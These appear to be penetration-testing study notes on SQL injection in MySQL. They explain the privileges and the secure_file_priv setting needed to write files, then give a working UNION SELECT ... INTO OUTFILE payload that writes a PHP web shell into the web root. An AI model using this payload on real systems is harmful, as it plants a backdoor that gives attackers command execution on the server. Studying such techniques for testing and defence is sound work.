## Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server


## secure_file_priv

- Determines where to read/write files from.
- An empty value lets us read all entire file system. Otherwise, if a certain directory is set, we can only read from the specified directory/folder. `NULL` means we cannot read/write from any directory.

#### Writing the Web Shell into the Web Root directory of our target application

If the below command doesn't generate any errors, understand that writing into the file was done successfully.

```mysql
cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>', "", "" INTO OUTFILE '</var/www/html/shell.php>'-- -
```
